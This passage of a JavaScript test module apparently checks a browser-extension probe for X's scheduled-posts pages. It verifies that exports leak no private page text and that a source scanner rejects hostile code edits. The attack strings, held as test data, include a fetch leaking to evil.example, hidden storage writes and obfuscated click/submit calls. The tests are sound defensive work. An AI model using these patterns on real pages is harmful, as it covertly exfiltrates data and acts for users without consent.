const CJK_RUN = /[\u3040-\u30ff\u3400-\u4dbf\u4e00-\u9fff\uac00-\ud7af]/;

// Every >=4-char printable-ASCII substring plus every >=2-char CJK run of a secret; a leak
// shows up as any one of these appearing in the output.
function secretFragments(needle) {
  const fragments = new Set();
  for (let i = 0; i < needle.length; i += 1) {
    const four = needle.slice(i, i + 4);
    if (four.length === 4 && /^[\x20-\x7e]+$/.test(four)) fragments.add(four);
    const two = needle.slice(i, i + 2);
    if (two.length === 2 && CJK_RUN.test(two[0]) && CJK_RUN.test(two[1])) fragments.add(two);
  }
  return fragments;
}

// A hostile synthetic page whose every content-bearing slot carries a secret: URL, uuid,
// email, @handle, English/CJK prose, prose aria-label/title/alt/placeholder, a long hash
// class, and a long data-* value. Nothing of it may survive into the skeleton, and the
// masked samples may not keep a single readable character.
export function attackSelfTest(reader = READER, mapper = SKELETON) {
  const secrets = [
    "https://example.com/a?b=c",
    "550e8400-e29b-41d4-a716-446655440000",
    "decoy@example.invalid",
    "decoy_handle",
    "Will send on Oct 10, 2026 at 9:00 AM",
    "明天下午四點準時發送敬請期待",
    "2026年7月20日(月)の午後4:24に送信されます",
    "sentence with words in a label",
    "private title of the post",
    "alt text describing the picture",
    "placeholder asks what is happening",
    "deadbeefdeadbeefcafe1234",
  ];
  const page = `<!DOCTYPE html><html lang="en"><body>`
    + `<section role="dialog" aria-modal="true">`
    + `<div role="tablist"><div role="tab" aria-selected="true" data-testid="cellInnerDiv">Scheduled</div></div>`
    + `<div class="r-9k2f7b1c8d4e6a3f5b0c css-long-hash-abcdef keep-me" data-renderkey="deadbeefdeadbeefcafe1234"`
    + ` id="550e8400-e29b-41d4-a716-446655440000" aria-label="sentence with words in a label"`
    + ` title="private title of the post">`
    + `<a href="https://example.com/a?b=c">https://example.com/a?b=c</a>`
    + `<img src="https://example.com/a?b=c" alt="alt text describing the picture">`
    + `<input placeholder="placeholder asks what is happening">`
    + `<aside class="decoy_handle-profile" role="decoy_handle" data-testid="decoy_handle" aria-hidden="decoy_handle"></aside>`
    + `<p>Will send on Oct 10, 2026 at 9:00 AM decoy@example.invalid @decoy_handle</p>`
    + `<p>明天下午四點準時發送敬請期待</p>`
    + `<p>2026年7月20日(月)の午後4:24に送信されます</p>`
    + `</div></section></body></html>`;
  const document = new DOMParser().parseFromString(page, "text/html");
  const skeleton = mapper.buildSkeleton(document, { pathname: "/home/compose/post/unsent/scheduled" });
  if (skeleton.includes("example")) throw new Error("self-test: skeleton leaked a URL host");
  if (!/^[\x20-\x7e\n]*$/.test(skeleton)) throw new Error("self-test: skeleton contains non-ASCII page content");
  for (const secret of secrets) {
    if (skeleton.includes(secret)) throw new Error(`self-test: skeleton leaked "${secret}"`);
    for (const fragment of secretFragments(secret)) {
      if (LEAK_ALLOWED.has(fragment)) continue;
      if (skeleton.includes(fragment)) throw new Error(`self-test: skeleton leaked fragment "${fragment}" of "${secret}"`);
    }
  }
  // The masked sample path: letters/marks/symbols become "x"; only digits, punctuation,
  // and spaces may survive, and at most 60 code points.
  let maskedCount = 0;
  for (const secret of secrets) {
    const masked = reader.maskSample(secret);
    const calendarOnly = secret === "Will send on Oct 10, 2026 at 9:00 AM" || secret === "2026年7月20日(月)の午後4:24に送信されます";
    if (calendarOnly && masked !== secret) throw new Error("self-test: calendar vocabulary not preserved");
    if (!calendarOnly && !masked.includes("x")) throw new Error(`self-test: maskSample left "${secret}" unmasked`);
    if (!calendarOnly && !/^(?:x|[\p{Nd}\p{P}\s])+$/u.test(masked)) throw new Error(`self-test: maskSample kept content from "${secret}": ${masked}`);
    if (Array.from(masked).length > 60) throw new Error("self-test: maskSample exceeded 60 code points");
    maskedCount += 1;
  }
  const hostile = new DOMParser().parseFromString('<html><body><section role="dialog"><button role="button"><span>Will send on 2027-04-05 18:30 UTC</span><div data-testid="tweetText"><span>Will send on 2027-04-05 18:30 UTC private 987654321</span></div><p>private purchase 2027 1122334455</p></button></section></body></html>', 'text/html');
  const report = reader.readSnapshot(hostile, { pathname: '/compose/post/unsent/scheduled' });
  const diag = reader.buildDiagnostic({ ...report, lang: 'decoy_handle', doclang: 'en-x-decoy_handle' });
  if (!/lang=x doclang=x/.test(diag)) throw new Error('self-test: diagnostic leaked unregistered language tags');
  for (const leak of ['decoy_handle', '987654321', '1122334455', 'private']) {
    if (diag.includes(leak)) throw new Error('self-test: diagnostic leaked content or sampled tweet body');
  }
  if (report.samples.length !== 1) throw new Error('self-test: time samples must come only from the isolated time label');
  // New calendar export path: body may look exactly like a date, so require DOM
  // isolation. This retains every original body/attribute leak assertion above.
  const extraSecrets = ['secretbody', 'May@January.example', '@May2026', 'https://May.example/2026', '987654321', '1122334455'];
  const calendarPage = new DOMParser().parseFromString('<html><body><section role="dialog"><button role="button"><div><span>Will send on Oct 10, 2026 at 9:00 AM secretbody May@January.example @May2026 https://May.example/2026 987654321</span></div><div data-testid="tweetText"><span>Will send on Dec 31, 2026 at 9:00 AM 1122334455</span></div></button><p>Will send on Oct 10, 2026 at 9:00 AM secretbody</p></section></body></html>', 'text/html');
  const calendarSkeleton = mapper.buildSkeleton(calendarPage, { pathname: '/compose/post/unsent/scheduled' });
  if (!calendarSkeleton.includes('calendar=')) throw new Error('self-test: isolated calendar sample path was not exercised');
  if (calendarSkeleton.includes('Dec') || calendarSkeleton.includes('31%2C')) throw new Error('self-test: calendar-looking tweet body leaked');
  for (const leak of extraSecrets) {
    for (const output of [calendarSkeleton, decodeURIComponent(calendarSkeleton), reader.buildDiagnostic(reader.readSnapshot(calendarPage, { pathname:'/compose/post/unsent/scheduled' }))]) {
      if (output.includes(leak)) throw new Error('self-test: calendar path leaked '+leak);
    }
  }
  // Calendar-shaped addresses must never preserve vocabulary/digits from identities.
  for (const secret of ['May@January.example', '@May2026', 'https://May.example/2026']) {
    if (!/^x+$/.test(reader.maskSample(secret))) throw new Error('self-test: calendar address unmasked');
  }
  const prose = 'Will send on private purchase 987654321 at 23:59';
  if (reader.timeSample(prose)) throw new Error('self-test: unknown date sample included prose/private numbers');
  calendarPage.querySelector('button span').textContent = prose;
  const proseSkeleton = mapper.buildSkeleton(calendarPage, { pathname:'/compose/post/unsent/scheduled' });
  const proseDiag = reader.buildDiagnostic(reader.readSnapshot(calendarPage, { pathname:'/compose/post/unsent/scheduled' }));
  if (proseSkeleton.includes('calendar=') || proseDiag.includes('987654321')) throw new Error('self-test: unknown date export leaked private numbers');
  const origin = mapper.hostnameOf('https://privateuser:secret@frame.example:8080/path?q=token');
  if (origin !== 'frame.example') throw new Error('self-test: iframe origin includes credentials/path/port');
  const embeddedDates = [
    'https://evil.example/將於2026年10月10日上午9:00傳送',
    '//evil.example/2026年7月20日の午後4:24に送信されます',
    '將於2026年10月10日上午9:00傳送@January.example',
    '@將於2026年10月10日上午9:00傳送',
    '"May 10, 2026 at 9:00 AM"@January.example',
    'https://fake.invalid/2026年11月3日週二下午11:19發送',
    '@2026年11月3日週二下午11:19',
    '2026年11月3日週二下午11:19@fake.invalid',
  ];
  for (const secret of embeddedDates) {
    if (reader.timeSample(secret) || !/^x+$/.test(reader.maskSample(secret))) throw new Error('self-test: date extraction laundered an identity');
    calendarPage.querySelector('button span').textContent = secret;
    const identityReport = reader.readSnapshot(calendarPage, { pathname:'/compose/post/unsent/scheduled' });
    if (identityReport.fmt || identityReport.samples.length || identityReport.timeFail !== 1 || mapper.buildSkeleton(calendarPage, { pathname:'/compose/post/unsent/scheduled' }).includes('calendar=')) throw new Error('self-test: calendar identity reached diagnostic or skeleton');
  }
  const legacyBody = new DOMParser().parseFromString('<html><body><section role="dialog"><div data-testid="cellInnerDiv"><div data-testid="tweetText">Will send on Oct 10, 2026 at 9:00 AM private 987654321</div></div></section></body></html>', 'text/html');
  const legacyReport = reader.readSnapshot(legacyBody, { pathname:'/compose/post/unsent/scheduled' });
  if (legacyReport.fmt || legacyReport.samples.length || /Oct|987654321/.test(reader.buildDiagnostic(legacyReport))) throw new Error('self-test: legacy body exported as a time sample');
  const readableFmt = reader.buildDiagnostic({ fmt: '將於2026年10月10日 上午9:00傳送' });
  if (!readableFmt.endsWith('\nfmt=將於2026年10月10日 上午9:00傳送')) throw new Error('self-test: fmt must be directly readable on its own line');
  const weekdayLabel = '將於 2026年11月3日 週二 下午11:99 發送';
  calendarPage.querySelector('button span').textContent = weekdayLabel+' private 987654321 @decoy_handle decoy@example.invalid';
  const weekdayReport = reader.readSnapshot(calendarPage, { pathname:'/compose/post/unsent/scheduled' });
  if (weekdayReport.timeFail !== 1 || weekdayReport.fmt !== weekdayLabel || weekdayReport.samples[0] !== weekdayLabel) throw new Error('self-test: weekday sample not safely preserved');
  const weekdayOutputs = [reader.buildDiagnostic(weekdayReport), decodeURIComponent(mapper.buildSkeleton(calendarPage, { pathname:'/compose/post/unsent/scheduled' }))];
  for (const output of weekdayOutputs) for (const leak of ['private','987654321','decoy_handle','decoy@example.invalid']) if (output.includes(leak)) throw new Error('self-test: weekday output leaked '+leak);
  const bodyTimePage = new DOMParser().parseFromString('<html><body><section role="dialog"><div data-testid="cellInnerDiv"><span>未知格式</span><div data-testid="tweetText">將於 2026年11月3日 週二 下午11:19 發送</div></div></section></body></html>', 'text/html');
  const bodyTimeReport = reader.readSnapshot(bodyTimePage, { pathname:'/compose/post/unsent/scheduled' });
  if (bodyTimeReport.items.length || bodyTimeReport.timeOk || bodyTimeReport.fmt || bodyTimeReport.samples.length) throw new Error('self-test: tweet body became schedule metadata');
  const bodyTimeRow = bodyTimePage.querySelector('[data-testid="cellInnerDiv"]');
  bodyTimeRow.querySelector('span').replaceWith(bodyTimePage.createElement('div'));
  bodyTimeRow.firstElementChild.textContent = 'Will send on 2027-01-01 23:59 UTC';
  bodyTimeRow.setAttribute('aria-label', bodyTimeRow.firstElementChild.textContent + ' ' + bodyTimeRow.querySelector('[data-testid="tweetText"]').textContent);
  const ariaBodyReport = reader.readSnapshot(bodyTimePage, { pathname:'/compose/post/unsent/scheduled' });
  if (ariaBodyReport.items.length || ariaBodyReport.timeOk || ariaBodyReport.timeFail !== 1 || ariaBodyReport.fmt || ariaBodyReport.samples.length) throw new Error('self-test: accessible label borrowed tweet body date');
  const optionPage = new DOMParser().parseFromString('<html><body><div role="dialog"><select name="year"><option value="2028" aria-label="private @decoy_handle decoy@example.invalid">Will send on Jan 1, 2028 at 9:00 AM private https://example.invalid/private</option></select></div></body></html>','text/html');
  const optionOutput = mapper.buildSkeleton(optionPage,{pathname:'/compose/post'});
  if (!/select /.test(optionOutput) || !/option /.test(optionOutput)) throw new Error('self-test: picker export not exercised');
  for (const secret of ['Jan','9:00','private','decoy_handle','decoy@example.invalid','https://example.invalid']) if (optionOutput.includes(secret)) throw new Error('self-test: picker option export leaked '+secret);
  if (!optionOutput.includes('option-values=2028')) throw new Error('self-test: safe numeric option sample missing');
  if (optionOutput.includes('calendar=')) throw new Error('self-test: option text became a calendar sample');
  const pickerSecrets=['@decoy_handle','decoy@example.invalid','https://example.invalid/private','123456789012345','550e8400-e29b-41d4-a716-446655440000','decoy_handle','select-decoy_handle'];
  let pickerCases=0;
  for (const tag of ['select','label']) for (const secret of pickerSecrets) {
    const doc=new DOMParser().parseFromString('<html><body></body></html>','text/html');
    const node=doc.createElement(tag);node.setAttribute('data-testid',secret);doc.body.append(node);
    const exported=mapper.buildSkeleton(doc,{pathname:'/compose/post'});
    for (const fragment of secretFragments(secret)) if (!LEAK_ALLOWED.has(fragment) && exported.includes(fragment)) throw new Error('self-test: picker testid identity leaked');
    pickerCases++;
  }
  const safePicker=new DOMParser().parseFromString('<html><body><label data-testid="month-label"></label><select data-testid="select-month"></select><div data-testid="select-month"></div></body></html>','text/html');
  const safeExport=mapper.buildSkeleton(safePicker,{pathname:'/compose/post'});
  if (!/label .*data-testid=month-label/.test(safeExport) || !/select .*data-testid=select-month/.test(safeExport) || !/div .*data-testid=x/.test(safeExport)) throw new Error('self-test: picker testid scope is incorrect');
  // 0.1.2 shared option-value boundary (also used by fill diagnostics). Keep all
  // prior option-prose attacks; only the newly authorized numeric value is visible.
  const valueSecrets=[...pickerSecrets,'private prose','AM\nprivate','2028-01-01','20281234'];
  let optionCases=0;
  for(const secret of valueSecrets) {
    if(mapper.safeOptionValue(secret)!=='x')throw new Error('self-test: unsafe fill value sample');
    const doc=new DOMParser().parseFromString('<html><body><div role="dialog"><select></select></div></body></html>','text/html');
    const select=doc.querySelector('select');
    for(const value of ['01',secret,'02',secret]){const option=doc.createElement('option');option.value=value;option.textContent='Private';select.append(option);}
    const exported=mapper.buildSkeleton(doc);
    if(!exported.includes('option-values=01|x|02|x') || exported.includes(secret))throw new Error('self-test: option sample leaked');
    optionCases++;
  }
  for(const value of ['0','01','2028','59','AM','PM','a','p','上午','下午','午前','午後','오전','오후'])if(mapper.safeOptionValue(value)!==value)throw new Error('self-test: calendar enum sample missing');
  return { secrets: secrets.length + 3 + extraSecrets.length + 4 + embeddedDates.length + 6 + 2 + pickerCases + optionCases, fragments: maskedCount };
}

export function positionStorageSelfTest() {
  const source = readFileSync(join(PROBE,'position.js'),'utf8');
  if (scanSource(source,'probe/position.js',{positionModule:true}).length) throw new Error('storage self-test: audited position module rejected');
  const forbidden = [
    'window.localStorage.setItem("xsched.probe.pos", "{}");',
    'window.localStorage.setItem("xsched.probe.panelPos", "{}");',
    'const store=window["local"+"Storage"];',
    'const a="local", b="Storage"; window[a+b].setItem("xsched.probe.pos","private");',
    'window.sessionStorage.setItem("xsched.probe.pos","{}");',
    'window.indexedDB.open("xsched.probe.pos");',
    'chrome.storage.local.set({x:1,y:2});',
    'chrome["storage"].sync.set({x:1,y:2});',
  ];
  for (const attack of forbidden) if (!scanSource(attack,'probe/elsewhere.js').length) throw new Error('storage self-test: storage allowed outside boundary');
  const mutations = [
    source.replace('"xsched.probe.pos"','"other.key"'),
    source.replace('"xsched.probe.pos"','"xsched.secret"'),
    source.replace('"xsched.probe.panelPos"','"xsched.probe.thirdPos"'),
    source.replace('"xsched.probe.panelPos"','"other.panel"'),
    source.replace('JSON.stringify(position)','JSON.stringify({ text: "private body" })'),
    source.replace('!valid(value)','false'),
    source.replace('Number.isFinite(value.x)','true'),
    source.replace('window.localStorage','window.sessionStorage'),
    source+'\nwindow.localStorage.setItem("xsched.probe.pos","private");',
    source+'\nwindow.indexedDB.open("xsched");',
    source+'\nchrome.storage.local.set({x:1});',
    source+'\nconst leak=fetch("https://evil.example/");',
  ];
  for (const attack of mutations) if (attack===source || !scanSource(attack,'probe/position.js',{positionModule:true}).length) throw new Error('storage self-test: edited boundary allowed');
  if (!scanSource(source,'probe/renamed.js').length) throw new Error('storage self-test: renamed module allowed');
  return forbidden.length+mutations.length+1;
}

export function nativeWriterSelfTest() {
  const source=readFileSync(join(PROBE,'quick.js'),'utf8');
  if (scanSource(source,'probe/quick.js',{quickModule:true}).length) throw new Error('native writer self-test: audited source rejected');
  const attacks=[
    'button.click()', 'const activate=button.click; activate.call(button)', 'button["cl"+"ick"]()',
    'form.submit()', 'const send=form.submit; send.call(form)', 'form["sub"+"mit"]()', 'form.requestSubmit()',
    'control.dispatchEvent(new Event("input"))', 'control["dispatch"+"Event"](new Event("change"))',
    'control.dispatchEvent(new MouseEvent("click"))', 'control.dispatchEvent(new PointerEvent("pointerdown"))',
    'control.dispatchEvent(new KeyboardEvent("keydown",{key:"Enter"}))', 'form.dispatchEvent(new SubmitEvent("submit"))',
    'HTMLElement.prototype.click.call(button)', 'label.click()',
    'control.focus(); control.dispatchEvent(new KeyboardEvent("keydown",{key:"Enter"}))',
    'const {click:activate}=button; activate.call(button)', 'const {click}=button; click.call(button)',
    'Reflect.get(button,"cl"+"ick").call(button)',
    'Reflect.get(\n button,\n "click"\n).call(button)',
    'const {"submit":send}=form; send.call(form)',
    'Object.getOwnPropertyDescriptor(HTMLFormElement.prototype,"submit").value.call(form)',
    'const dispatch=control.dispatchEvent; dispatch.call(control,new Event("click"))',
    'button.onclick()', 'const send=form.onsubmit; send.call(form)',
    'button[/* gap */"cl"+"ick"]()',
  ];
  for(const attack of attacks) if(!scanSource(attack,'probe/elsewhere.js').length) throw new Error('native writer self-test: activation allowed');
  const edits=[source.replace("Event('input'","Event('click'"),source.replace("Event('change'","Event('submit'"),source.replace("if (!detected.ready || !at)","if (!at)"),source+'\nform.requestSubmit();',source+'\nbutton.click();',source+'\ncontrol.dispatchEvent(new Event("change"));'];
  for(const edit of edits) if(edit===source || !scanSource(edit,'probe/quick.js',{quickModule:true}).length) throw new Error('native writer self-test: edited writer allowed');
  const realEdits=[
    source.replace("if(!await readSettled(doc,matches))", "if(false)"),
    source.replace("if (!withinDateBounds(detected.fields.dateInput,at))", "if (false)"),
    source.replace("(text===expected || (!text && value===expected)) && (!value || value===expected)", "true"),
    source.replace("control.dispatchEvent(new doc.defaultView.Event('change'", "doc.body.dispatchEvent(new doc.defaultView.Event('change'"),
    source.replace("setter.call(control,value)", "control.value=value"),
    source+'\nconst activate=document.querySelector("button").click;activate();',
  ];
  const asyncEdits=[
    source.replace("if(!control.isConnected || control.ownerDocument!==doc)throw new Error('detached');", ""),
    source.replace("const picker=currentPicker(doc,dialog);\n      const control=picker?.fields[key];", "const picker=detected;\n      const control=picker.fields[key];"),
    source.replace("['year','month','day','period','hour','minute']", "['month','day','year','hour','minute','period']"),
    source.replace("await settle(doc);", "await Promise.resolve();"),
    source.replace("if(!await readSettled(doc,()=>matchesTarget(currentPicker(doc,dialog),key,wanted[key])))", "if(false)"),
    source.replace("if(!await readSettled(doc,()=>restoredFieldMatches(key)))", "if(false)"),
    source.replace("return candidates.length===1 ? candidates[0] : null;", "return candidates[0];"),
    source.replace("return value!==null && detected.fields[key]?.value===value;", "return true;"),
    source.replace("const value=originalValue(control,key);", "const value=originals[key];"),
    source.replaceAll(" || control.closest(QUICK_CONFIG.dialog)!==dialog", ""),
  ];
  for(const edit of asyncEdits)if(edit===source || !scanSource(edit,'probe/quick.js',{quickModule:true}).length)throw new Error('native writer self-test: async protection removed');
  for (const edit of realEdits) if(edit===source || !scanSource(edit,'probe/quick.js',{quickModule:true}).length) throw new Error('native writer self-test: altered real picker boundary accepted');
  if(!scanSource(source,'probe/renamed.js').length) throw new Error('native writer self-test: renamed writer allowed');
  return attacks.length+edits.length+1+realEdits.length+asyncEdits.length;
}

export function authorLinkSelfTest() {
  const ui = readFileSync(join(PROBE, 'ui.js'), 'utf8');
  if (!ui.includes(AUTHOR_LINK_SOURCE) || scanSource(ui, 'probe/ui.js').length) throw new Error('author-link self-test: fixed anchor rejected');
  const attacks = [
    ...['https://x.com/punkcan2', 'https://evil.example/', 'http://x.com/punkcan', 'https://x.com/punkcan/', 'https://x.com/punkcan?x=1', 'https://x.com/punkcan#x']
      .map(url => [AUTHOR_LINK_SOURCE.replace('https://x.com/punkcan', url), 'probe/ui.js']),
    [AUTHOR_LINK_SOURCE.replace("createElement('a')", "createElement('img')"), 'probe/ui.js'],
    [AUTHOR_LINK_SOURCE.replace("'href'", "'src'"), 'probe/ui.js'],
    [AUTHOR_LINK_SOURCE.replace("createElement('a')", "createElement('img')").replace("'href'", "'src'"), 'probe/ui.js'],
    [AUTHOR_LINK_SOURCE.replace("const link = document.createElement('a');", "let link = document.createElement('a');\n  link = document.createElement('img');"), 'probe/ui.js'],
    ...['probe/content.js', 'probe/other.js', 'probe/nested/ui.js', 'ui.js'].map(label => [AUTHOR_LINK_SOURCE, label]),
    [AUTHOR_HREF_STATEMENT, 'probe/ui.js'],
    [AUTHOR_LINK_SOURCE + '\n' + AUTHOR_LINK_SOURCE, 'probe/ui.js'],
    [AUTHOR_LINK_SOURCE + "\nconst img = document.createElement('img'); img.src = 'https://x.com/punkcan';", 'probe/ui.js'],
    [AUTHOR_LINK_SOURCE + "\nfetch('https://x.com/punkcan');", 'probe/ui.js'],
    [AUTHOR_LINK_SOURCE + "\nnode.setAttribute('href', 'https://evil.example/');", 'probe/ui.js'],
    [AUTHOR_LINK_SOURCE + "\nnode.setAttributeNS(null, 'href', 'https://x.com/punkcan');", 'probe/ui.js'],
    [AUTHOR_LINK_SOURCE + "\nnode.innerHTML = '<a>';", 'probe/ui.js'],
    [AUTHOR_LINK_SOURCE + "\nwindow.localStorage.setItem('x', 'y');", 'probe/ui.js'],
  ];
  for (const [source, label] of attacks) {
    // Mutate the complete approved UI, rather than rejecting only fragments
    // because their digest differs. Other-file cases retain their actual label.
    const fullSource = ui.replace(AUTHOR_LINK_SOURCE, source);
    if (fullSource === ui && label === 'probe/ui.js') throw new Error('author-link self-test: unchanged attack');
    if (!scanSource(fullSource, label).length) throw new Error('author-link self-test: unsafe href/source allowed');
  }
  return attacks.length;
}

export function urlMutationSelfTest() {
  const cases = [];
  for (const key of ['href', 'search', 'hostname', 'host', 'pathname', 'protocol', 'port', 'hash', 'origin', 'username', 'password']) {
    for (const source of [
      `author.${key} = 'x';`, `author['${key}'] = 'x';`,
      `author['\\u${key.charCodeAt(0).toString(16).padStart(4, '0')}${key.slice(1)}'] = 'x';`,
      `author['${key.slice(0, 1)}' + '${key.slice(1)}'] = 'x';`,
      `author.${key} += 'x';`, `author.${key}++;`, `++author.${key};`,
      `({value: author.${key}} = input);`, `(author.${key}) = 'x';`,
      `for (author.${key} of values) {}`, `delete author.${key};`,
    ]) cases.push([source, 'URL component write']);
  }
  for (const source of [
    "author.search = '?x=1';", "author.hostname = 'evil.example';",
    "author.search ||= '?x=1';", "author.search ??= '?x=1';", "author.search &&= '?x=1';",
    '++(author).search', '--(getAuthor()).hostname', 'delete (getAuthor()).search',
    '({first:author.search, second:other.value} = input)', 'for ((author.search) of values) {}',
  ]) cases.push([source, 'URL component write']);
  for (const source of [
    'Reflect.set(author, "search", "?x=1")', 'Reflect["s"+"et"](author, key, value)',
    'const {set: write}=Reflect; write(author,key,value)', 'const write=Reflect.set; write(author,key,value)',
    'Reflect.defineProperty(author,"hostname",{value:"evil.example"})',
    'Object.assign(author,{search:"?x=1"})', 'Object["ass"+"ign"](author,values)',
    'const {assign: write}=Object; write(author,values)', 'const write=Object.assign; write(author,values)',
    'Object.defineProperty(author,"search",{value:"?x=1"})',
    'Object.defineProperties(author,{search:{value:"?x=1"}})',
    'const {defineProperty: write}=Object; write(author,key,descriptor)',
    'Object.getOwnPropertyDescriptor(HTMLAnchorElement.prototype,"search").set.call(author,"?x=1")',
    'Object.getOwnPropertyDescriptors(HTMLAnchorElement.prototype).hostname.set.call(author,"evil.example")',
    'author.__defineSetter__("search",write)', 'Object.setPrototypeOf(author,other)',
  ]) cases.push([source, 'reflective property mutation/extraction']);
  for (const source of [
    'author[key] = value', 'author[key] += value', 'author[key]++', '++author[key]',
    '(author[key]) = value', '({value:author[key]} = input)', 'for(author[key] of values) {}',
    'delete author[key]', 'author[key] ??= value',
    '++(author[key])', '--(getAuthor()[key])',
    '({first:author[key], second:other.value} = input)', 'for ((author[key]) of values) {}',
  ]) cases.push([source, 'dynamic property write']);
  for (const [source, rule] of cases) {
    // No UI/content digest failure can mask a missing global URL-write rule.
    if (!scanSource(source, 'probe/elsewhere.js').some(error => error.includes(rule))) throw new Error(`URL mutation self-test: missed ${source}`);
  }
  if (scanSource('const name = address.hostname; const search = address.search;', 'probe/elsewhere.js').length) throw new Error('URL mutation self-test: reads rejected');
  return cases.length;
}

export function authorBoundarySelfTest() {
  const ui = readFileSync(join(PROBE, 'ui.js'), 'utf8');
  const content = readFileSync(join(PROBE, 'content.js'), 'utf8');
  if (scanSource(content, 'probe/content.js').length) throw new Error('author boundary self-test: approved call rejected');
  const call = 'createAuthorLink()';
  if (content.split(call).length !== 2) throw new Error('author boundary self-test: expected one zero-argument call');
  const contentEdits = [
    content.replace(call, "createAuthorLink({createElement: () => document.createElement('link')})"),
    content.replace(call, 'createAuthorLink(document)'),
    content.replace(call, 'createAuthorLink.call(fake)'),
    content.replace(call, 'createAuthorLink.apply(null,[fake])'),
    content.replace(call, 'Reflect.apply(createAuthorLink,null,[fake])'),
    content.replace(call, 'globalThis.XSCHED_UI.createAuthorLink(fake)'),
    content.replace(call, 'otherFactory()'),
    content.replace(call, '(createAuthorLink(), createAuthorLink())'),
    content.replace('panel.append(author);', "author.search = '?x=1'; panel.append(author);"),
    content.replace('panel.append(author);', "author.hostname = 'evil.example'; panel.append(author);"),
    content.replace('panel.append(author);', "author.rel = 'stylesheet'; document.head.append(author);"),
    content + '\nconst factory = globalThis.XSCHED_UI.createAuthorLink; factory(fake);',
  ];
  const uiEdits = [
    ui.replace('function createAuthorLink() {', 'function createAuthorLink(document) {'),
    ui.replace("document.createElement('a')", "document.createElement('link')"),
    ui.replace("  if (link.tagName !== 'A') throw new Error('Expected author anchor');\n", ''),
    ui.replace('function createAuthorLink() {', "function createAuthorLink() {\n  const document = {createElement: () => globalThis.document.createElement('link')};"),
    ui + "\ndocument.createElement = () => document.createElement('link');",
  ];
  for (const [sources, original, label] of [[contentEdits, content, 'probe/content.js'], [uiEdits, ui, 'probe/ui.js']]) {
    for (const source of sources) {
      if (source === original || !scanSource(source, label).some(error => error.includes('differs from reviewed source'))) throw new Error('author boundary self-test: modified definition/call allowed');
    }
  }
  const extraFiles = [
    'globalThis.XSCHED_UI.createAuthorLink()',
    'const {createAuthorLink: factory}=globalThis.XSCHED_UI; factory(fake)',
    'globalThis["XSCHED_"+"UI"]["createAuthor"+"Link"](fake)',
    'document.createElement = fake',
    'globalThis["document"] = fake',
    'const {document, unused} = fake',
    'let {value: {document, unused}} = fake',
    'var {first = 1, document, unused} = fake',
    '({method: Document.prototype.createElement, unused} = fake)',
    '({document, unused} = fake)',
    'for (Document.prototype.createElement of values) {}',
  ];
  for (const source of extraFiles) if (!scanSource(source, 'probe/other.js').length) throw new Error('author boundary self-test: alternate file/factory allowed');
  return contentEdits.length + uiEdits.length + extraFiles.length;
}

export function destructuringSelfTest() {
  const attacks = [];
  const targets = ['href', 'search', 'hostname', 'host', 'pathname', 'protocol', 'port', 'hash', 'origin', 'username', 'password'].map(key => `author.${key}`);
  targets.push('document', 'Document.prototype.createElement');
  for (const target of targets) {
    const pattern = `{first: ${target}, second: {value: other}}`;
    attacks.push(
      `(${pattern} = {first: '?x=1', second: {value: 0}});`,
      `for (${pattern} of values) {}`,
      `for (${pattern} in values) {}`,
      `({outer: ${pattern}} = values);`,
      `([{outer: ${pattern}}, ...rest] = values);`,
      `({first: ${target} = fallback, second: {value: other = 0}} = values);`,
      `for ({outer: ${pattern}} of values) {}`,
      `for ([${pattern}] in values) {}`,
      '`x${(' + pattern + ' = values)}`',
      `({first: ${target}, second: {value: [other, {deep: tail}]}} = values);`,
    );
  }
  for (const name of ['document', 'createElement']) {
    const pattern = `{nested: {${name}, after: {value: other}}}`;
    attacks.push(
      `const ${pattern} = input;`, `let ${pattern} = input;`,
      `for (const ${pattern} of values) {}`, `for (let ${pattern} in values) {}`,
      `function f(${pattern}) {}`, `const f = (${pattern}) => 0;`,
      `try {} catch (${pattern}) {}`, `function f(${pattern} = {}) {}`,
    );
  }
  attacks.push(
    '({nested:{docu\\u006dent, after:{value: other}}} = input)',
    'const {nested:{create\\u0045lement, after:{value: other}}} = input',
    '({nested:{value: author["search"]}, after:{value: other}} = input)',
    '({nested:{value: author[key]}, after:{value: other}} = input)',
    '({nested:{value: author["se"+"arch"]}, after:{value: other}} = input)',
    '({value: author.search, ...rest} = input)',
    '({value: other = (author.hostname = "evil.example"), after:{nested: tail}} = input)',
    '({value: this["search"], after:{nested: tail}} = input)',
    '({value: super[key], after:{nested: tail}} = input)',
    '({value: /x/[key], after:{nested: tail}} = input)',
    '({value: tag`x`[key], after:{nested: tail}} = input)',
  );
  let deep = '{value: author.search}';
  for (let level = 0; level < 64; level++) deep = `{level: [${deep}]}`;
  attacks.push(`(${deep} = input)`);
  for (const source of attacks) {
    if (!scanSource(source, 'probe/reader.js').some(error => /destructuring .* forbidden/.test(error))) throw new Error(`destructuring self-test: missed ${source}`);
  }
  for (const source of [
    'const {first, second:{value: other}} = input;',
    'for (const [key, value] of entries) {}',
    'function f({first = 0, second: [value]}) {}',
    'const data = {nested: {value: author.search}};',
    'const text = "({value: author.search} = input)";',
    'const pattern = /[{](author.search)[}]/;',
    'const text = `({value: author.search} = input)`;',
    '/* ({value: author.search} = input) */ const value = 0;',
  ]) if (checkDestructuring(source, 'probe/reader.js').length) throw new Error('destructuring self-test: safe source rejected');
  return attacks.length;
}

export function resourcePropertySelfTest() {
  // Explicit pairs make missing mappings fail rather than shrink the matrix.
  const pairs = [
    ['src', 'src'], ['href', 'href'], ['srcset', 'srcset'], ['action', 'action'],
    ['poster', 'poster'], ['data', 'data'], ['ping', 'ping'], ['formaction', 'formAction'],
    ['attributionsrc', 'attributionSrc'], ['background', 'background'],
    ['referrerpolicy', 'referrerPolicy'], ['srcdoc', 'srcdoc'],
  ];
  if (JSON.stringify(Object.entries(RESOURCE_ATTRIBUTE_IDL)) !== JSON.stringify(pairs)) throw new Error('resource self-test: attribute/IDL map changed');
  const cases = [];
  for (const [attribute, key] of pairs) {
    const escape = `\\u${key.charCodeAt(0).toString(16).padStart(4, '0')}${key.slice(1)}`;
    const kind = key === 'href' ? 'URL component write' : 'resource property write';
    for (const source of [
      `author.${key} = value;`, `author.${escape} = value;`,
      `author.\\u{${key.charCodeAt(0).toString(16)}}${key.slice(1)} = value;`,
      `author['${key}'] = value;`, `author['${escape}'] = value;`,
      `author['\\x${key.charCodeAt(0).toString(16)}${key.slice(1)}'] = value;`,
      `author['${key[0]}' + '${key.slice(1)}'] = value;`,
      `author[/*key*/'${key}'] = value;`,
      `author.${key} += value;`, `author.${key} ||= value;`, `author.${key} ??= value;`,
      `author.${key}++;`, `++author.${key};`, `delete author.${key};`,
      `(getAuthor()).${key} = value;`,
